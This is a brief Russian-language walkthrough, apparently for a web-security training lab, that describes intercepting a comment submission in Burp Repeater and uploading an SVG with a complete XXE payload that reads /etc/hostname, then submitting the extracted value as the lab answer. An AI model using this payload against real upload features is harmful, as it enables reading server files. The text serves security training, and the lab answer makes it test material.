1) Перехватываем запрос от отправки коммента
2) Отправляем запрос в repeater. Отменяем перехват
3) Задаем filename как 1.svg.
4) Добавляем картинку таким кодом: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
5) Запуск кода
6) Обновить страницу
7) Открыть фото
8) Извлекаем ключ faa13ffd8931
9) Вводим его в поле "submit answer"
10) Лаба выполнена
